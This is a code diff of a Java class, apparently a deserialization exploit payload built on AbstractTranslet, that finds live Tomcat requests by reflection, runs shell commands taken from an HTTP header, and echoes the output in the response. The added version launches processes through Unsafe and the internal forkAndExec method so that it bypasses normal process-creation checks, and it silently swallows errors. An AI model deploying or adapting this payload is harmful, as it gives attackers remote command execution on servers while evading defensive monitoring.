@@ -5,107 +5,166 @@ import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import sun.misc.Unsafe;
+
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.lang.reflect.Field;
-import java.util.List;
-import java.util.Scanner;
+import java.lang.reflect.Method;
 
 public class TomcatEchoTemplate extends AbstractTranslet {
 
     public TomcatEchoTemplate(){
-        try{
-            boolean var4 = false;
-            Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
-
-            for(int var6 = 0; var6 < var5.length; ++var6) {
-                Thread var7 = var5[var6];
-                if (var7 != null) {
-                    String var3 = var7.getName();
-                    if (!var3.contains("exec") && var3.contains("http")) {
-                        Object var1 = getFV(var7, "target");
-                        if (var1 instanceof Runnable) {
-                            try {
-                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
-                            } catch (Exception var13) {
-                                continue;
-                            }
-
-                            List var9 = (List)getFV(var1, "processors");
-
-                            for(int var10 = 0; var10 < var9.size(); ++var10) {
-                                Object var11 = var9.get(var10);
-                                var1 = getFV(var11, "req");
-                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
-                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "Testecho");
-                                if (var3 != null && !var3.isEmpty()) {
-                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
-                                    var2.getClass().getMethod("addHeader", String.class, String.class).invoke(var2, "Testecho", var3);
-                                    var4 = true;
-                                }
-
-                                var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "cmd");
-                                if (var3 != null && !var3.isEmpty()) {
-                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
-                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var3} : new String[]{"/bin/sh", "-c", var3};
-                                    writeBody(var2, (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
-                                    var4 = true;
-                                }
-
-                                if ((var3 == null || var3.isEmpty()) && var4) {
-                                    writeBody(var2, System.getProperties().toString().getBytes());
-                                }
-
-                                if (var4) {
-                                    break;
-                                }
-                            }
-
-                            if (var4) {
-                                break;
-                            }
-                        }
+        try {
+            boolean                 flag  = false;
+            ThreadGroup             group = Thread.currentThread().getThreadGroup();
+            java.lang.reflect.Field f     = group.getClass().getDeclaredField("threads");
+            f.setAccessible(true);
+            Thread[] threads = (Thread[]) f.get(group);
+            for (int i = 0; i < threads.length; i++) {
+                try {
+                    Thread t = threads[i];
+                    if (t == null) continue;
+                    String str = t.getName();
+                    if (str.contains("exec") || !str.contains("http")) continue;
+                    f = t.getClass().getDeclaredField("target");
+                    f.setAccessible(true);
+                    Object obj = f.get(t);
+                    if (!(obj instanceof Runnable)) continue;
+                    f = obj.getClass().getDeclaredField("this$0");
+                    f.setAccessible(true);
+                    obj = f.get(obj);
+                    try {
+                        f = obj.getClass().getDeclaredField("handler");
+                    } catch (NoSuchFieldException e) {
+                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                     }
+                    f.setAccessible(true);
+                    obj = f.get(obj);
+                    try {
+                        f = obj.getClass().getSuperclass().getDeclaredField("global");
+                    } catch (NoSuchFieldException e) {
+                        f = obj.getClass().getDeclaredField("global");
+                    }
+                    f.setAccessible(true);
+                    obj = f.get(obj);
+                    f = obj.getClass().getDeclaredField("processors");
+                    f.setAccessible(true);
+                    java.util.List processors = (java.util.List) (f.get(obj));
+                    for (int j = 0; j < processors.size(); ++j) {
+                        Object processor = processors.get(j);
+                        f = processor.getClass().getDeclaredField("req");
+                        f.setAccessible(true);
+                        Object req  = f.get(processor);
+                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
+                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"nu1r"});
+                        if (str != null && !str.isEmpty()) {
+                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
+
+                            String[] cmds = null;
+                            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                                cmds = new String[]{"cmd", "/c", str};
+                            } else {
+                                cmds = new String[]{"/bin/bash", "-c", str};
+                            }
+                            Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+                            theUnsafeField.setAccessible(true);
+                            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+
+                            Class processClass = null;
+
+                            try {
+                                processClass = Class.forName("java.lang.UNIXProcess");
+                            } catch (ClassNotFoundException e) {
+                                processClass = Class.forName("java.lang.ProcessImpl");
+                            }
+
+                            Object   processObject = unsafe.allocateInstance(processClass);
+                            byte[][] args          = new byte[cmds.length - 1][];
+                            int      size          = args.length;
+
+                            for (int k = 0; k < args.length; k++) {
+                                args[k] = cmds[k + 1].getBytes();
+                                size += args[k].length;
+                            }
+
+                            byte[] argBlock = new byte[size];
+                            int    l        = 0;
+
+                            for (byte[] arg : args) {
+                                System.arraycopy(arg, 0, argBlock, l, arg.length);
+                                l += arg.length + 1;
+                            }
+
+                            int[] envc                 = new int[1];
+                            int[] std_fds              = new int[]{-1, -1, -1};
+                            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
+                            Field helperpathField      = processClass.getDeclaredField("helperpath");
+                            launchMechanismField.setAccessible(true);
+                            helperpathField.setAccessible(true);
+                            Object launchMechanismObject = launchMechanismField.get(processObject);
+                            byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
+
+                            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+
+                            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
+                                    byte[].class, int.class, byte[].class, int[].class, boolean.class);
+
+                            forkMethod.setAccessible(true);//
+
+                            forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
+                                    null, envc[0], null, std_fds, false);
+
+                            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
+                            initStreamsMethod.setAccessible(true);
+                            initStreamsMethod.invoke(processObject, std_fds);
+
+                            Method getInputStreamMethod = processClass.getMethod("getInputStream");
+                            getInputStreamMethod.setAccessible(true);
+                            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
+
+                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                            int                   a    = 0;
+                            byte[]                b    = new byte[1024];
+
+                            while ((a = in.read(b)) != -1) {
+                                baos.write(b, 0, a);
+                            }
+
+                            try {
+                                Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+                                obj = cls.newInstance();
+                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, baos.toByteArray(), new Integer(0), baos.toByteArray().length);
+                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
+                            } catch (NoSuchMethodException var5) {
+                                Class cls = Class.forName("java.nio.ByteBuffer");
+                                obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{baos.toByteArray()});
+                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
+                            }
+                            flag = true;
+                            flag = true;
+                        }
+                        if (flag) break;
+                    }
+                    if (flag) break;
+                } catch (Exception ignored) {
                 }
             }
-        }catch (Exception e){
-            e.printStackTrace();
+
+        } catch (Exception ignored) {
         }
     }
 
-    private static void writeBody(Object var0, byte[] var1) throws Exception {
-        Object var2;
-        Class var3;
-        try {
-            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-            var2 = var3.newInstance();
-            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
-            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
-        } catch (NoSuchMethodException var5) {
-            var3 = Class.forName("java.nio.ByteBuffer");
-            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
-            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
-        }
-
-    }
-
-    private static Object getFV(Object var0, String var1) throws Exception {
-        Field var2 = null;
-        Class var3 = var0.getClass();
-
-        while(var3 != Object.class) {
-            try {
-                var2 = var3.getDeclaredField(var1);
-                break;
-            } catch (NoSuchFieldException var5) {
-                var3 = var3.getSuperclass();
-            }
-        }
-
-        if (var2 == null) {
-            throw new NoSuchFieldException(var1);
-        } else {
-            var2.setAccessible(true);
-            return var2.get(var0);
-        }
+    public static byte[] toCString(String s) {
+        if (s == null)
+            return null;
+        byte[] bytes  = s.getBytes();
+        byte[] result = new byte[bytes.length + 1];
+        System.arraycopy(bytes, 0,
+                result, 0,
+                bytes.length);
+        result[result.length - 1] = (byte) 0;
+        return result;
     }
 
     @Override
